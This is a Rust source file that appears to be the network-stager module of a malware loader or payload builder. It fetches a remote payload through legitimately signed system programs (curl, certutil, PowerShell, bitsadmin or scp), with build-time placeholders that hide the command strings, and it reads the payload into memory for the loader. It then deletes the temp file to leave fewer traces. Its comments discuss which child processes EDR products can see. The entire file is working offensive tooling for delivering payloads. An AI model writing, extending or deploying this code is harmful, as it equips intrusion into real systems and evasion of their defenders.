// --- Network stager: child-process transport ---
//
// The fetch rides a legitimately signed program (`curl`, `certutil`,
// `powershell`, `bitsadmin` or `scp`), which writes the payload to a temp file
// the loader reads. Nothing about the network stack is linked into the stub,
// but the child process and its command line are visible to an EDR (see the
// technique README).

use std::io::Read;
use std::path::PathBuf;
use std::process::{Child, Command};

/// Runs a downloader command, waiting up to `timeout_ms` for it to exit.
fn run_cmd(bin: &str, args: &[String], timeout_ms: u32) -> Result<(), String> {
    crate::tech_dbg!("network_stager", "running the downloader");
    let mut child: Child = Command::new(bin)
        .args(args)
        .spawn()
        .map_err(|e| format!("{}: {e}", $MSG_SPAWN_FAILED$))?;
    let deadline =
        std::time::Instant::now() + std::time::Duration::from_millis(timeout_ms as u64);
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                if status.success() {
                    return Ok(());
                }
                return Err(format!(
                    "{} (exit {})",
                    $MSG_DOWNLOAD_FAILED$,
                    status.code().unwrap_or(-1)
                ));
            }
            Ok(None) => {
                if std::time::Instant::now() >= deadline {
                    let _ = child.kill();
                    // Reap the downloader so its file handle is closed before
                    // the temp-file guard deletes the partial file.
                    let _ = child.wait();
                    return Err($MSG_TIMEOUT$);
                }
                std::thread::sleep(std::time::Duration::from_millis(20));
            }
            Err(_) => {
                // `try_wait` failed, so the child's state is unknown: do not
                // leave it running with the temp file open.
                let _ = child.kill();
                let _ = child.wait();
                return Err($MSG_DOWNLOAD_FAILED$);
            }
        }
    }
}

/// Builds the downloader's command for the transport chosen at build time.
///
/// `$DOWNLOADER$` is a build-time constant: 0 scp, 1 curl, 2 certutil,
/// 3 powershell, 4 bitsadmin.
fn download_command(
    url: &str,
    scp_target: &str,
    scp_port: &str,
    out: &str,
) -> (String, Vec<String>) {
    match $DOWNLOADER$ {
        0 => {
            let bin: String = $BIN_SCP$;
            let arg_o: String = $ARG_O$;
            let arg_strict: String = $ARG_STRICT$;
            let arg_p: String = $ARG_P$;
            let mut args = vec![arg_o, arg_strict];
            if !scp_port.is_empty() {
                args.push(arg_p);
                args.push(scp_port.to_string());
            }
            args.push(scp_target.to_string());
            args.push(out.to_string());
            (bin, args)
        }
        1 => (
            $BIN_CURL$,
            vec![
                $ARG_CURL_SILENT$,
                $ARG_CURL_OUTPUT$,
                out.to_string(),
                url.to_string(),
            ],
        ),
        2 => (
            $BIN_CERTUTIL$,
            vec![
                $ARG_URLCACHE$,
                $ARG_SPLIT$,
                $ARG_F$,
                url.to_string(),
                out.to_string(),
            ],
        ),
        3 => {
            let bin: String = $BIN_POWERSHELL$;
            let script = format!(
                "{}{}{}{}{}",
                $PS_URI_PREFIX$, url, $PS_OUTFILE_MID$, out, $PS_SUFFIX$
            );
            (bin, vec![$ARG_PS_NOPROFILE$, $ARG_PS_COMMAND$, script])
        }
        _ => (
            $BIN_BITSADMIN$,
            vec![
                $ARG_BITS_TRANSFER$,
                $ARG_BITS_JOB$,
                $ARG_BITS_DOWNLOAD$,
                $ARG_BITS_PRIORITY$,
                $ARG_BITS_NORMAL$,
                url.to_string(),
                out.to_string(),
            ],
        ),
    }
}

/// Removes the downloader's temp file when the fetch ends.
///
/// The file is on disk before the loader reads it, so every exit path after the
/// downloader ran — success, a failed read or an oversized body — has to delete
/// it; a drop guard makes that unconditional and keeps `?` from skipping it.
struct TempFile(PathBuf);

impl Drop for TempFile {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.0);
    }
}

/// Downloads the configured URL to a per-process temp file and returns its
/// bytes.
fn fetch() -> Result<Vec<u8>, String> {
    let url: String = $URL_DEF$;
    let scp_target: String = $SCP_TARGET_DEF$;
    let scp_port: String = $SCP_PORT_DEF$;
    let out = std::env::temp_dir().join(std::process::id().to_string());
    let out_arg = out.to_string_lossy().into_owned();

    // The downloader writes here; the guard installed first removes the file on
    // success and on every error path below, including a failed or timed-out
    // download that left a partial file.
    let _cleanup = TempFile(out.clone());
    let (bin, args) = download_command(&url, &scp_target, &scp_port, &out_arg);
    run_cmd(&bin, &args, $TIMEOUT_MS$)?;

    let meta = match std::fs::metadata(&out) {
        Ok(meta) => meta,
        Err(e) => {
            crate::tech_dbg!("network_stager", "the downloader left no file at {out_arg}");
            return Err(format!("{}: {e}", $MSG_READ_FAILED$));
        }
    };
    crate::tech_dbg!("network_stager", "downloaded {} bytes to {out_arg}", meta.len());
    if meta.len() > MAX_STAGED_BYTES as u64 {
        return Err($MSG_TOO_LARGE$);
    }

    // Metadata can lie (or the file can grow after it was read), so the read is
    // bounded too: one byte past the cap tells a body at the limit from one
    // that ran over it.
    let file = std::fs::File::open(&out).map_err(|e| format!("{}: {e}", $MSG_READ_FAILED$))?;
    let mut bytes = Vec::new();
    file.take(MAX_STAGED_BYTES as u64 + 1)
        .read_to_end(&mut bytes)
        .map_err(|e| format!("{}: {e}", $MSG_READ_FAILED$))?;
    if bytes.len() > MAX_STAGED_BYTES {
        return Err($MSG_TOO_LARGE$);
    }
    Ok(bytes)
}
